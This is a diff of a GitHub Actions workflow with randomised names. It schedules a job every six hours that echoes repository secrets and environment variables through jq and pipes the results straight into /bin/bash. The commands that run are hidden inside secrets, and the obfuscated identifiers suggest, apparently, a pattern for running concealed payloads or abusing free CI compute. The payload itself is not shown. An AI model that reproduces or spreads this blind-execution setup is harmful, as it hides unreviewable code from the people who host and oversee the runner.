@@ -1,21 +1,28 @@
 name: xiaqimin3434
+
 on:
   workflow_dispatch:
   schedule:
-    - cron: '51 1/6 * * *'
-
-jobs:  # 32180
+    - cron: '38 2/6 * * *'
+jobs:
   build:
     runs-on: ubuntu-latest
+
     steps:
       - uses: actions/checkout@v4
       - name: xiaqimin3434
         env:
-          p3: ${{ secrets.p3 }}
+          acf226: ${{ secrets.acf226 }}
         run: |
-          echo $p3 | jq -r .y40363 | /bin/bash
-          echo $v1763 | jq -r .itbij3 | /bin/bash
-          echo $jiaf30 | jq -r .rvbrm4 | /bin/bash
-          echo $lh06 | jq -r .aawwv785 | /bin/bash
-          echo $y88964 | jq -r .lf16 | /bin/bash
+          echo $acf226 | jq -r .buin890 | /bin/bash
+          echo $uqxlc808 | jq -r .k394 | /bin/bash
+          echo $tqua5 | jq -r .mkhp7 | /bin/bash
+          echo $y7 | jq -r .wa2029 | /bin/bash
+          echo $jtd4587 | jq -r .hyx12 | /bin/bash
+          echo $zriej3 | jq -r .c0551 | /bin/bash
+          echo $eigub0 | jq -r .naixs4 | /bin/bash
+          echo $bci54 | jq -r .ujqqp55 | /bin/bash
+          echo $sp89231 | jq -r .ckhf5 | /bin/bash
+          echo $pnnz6 | jq -r .ikz24977 | /bin/bash
+          echo $wcip7421 | jq -r .zx5 | /bin/bash
 
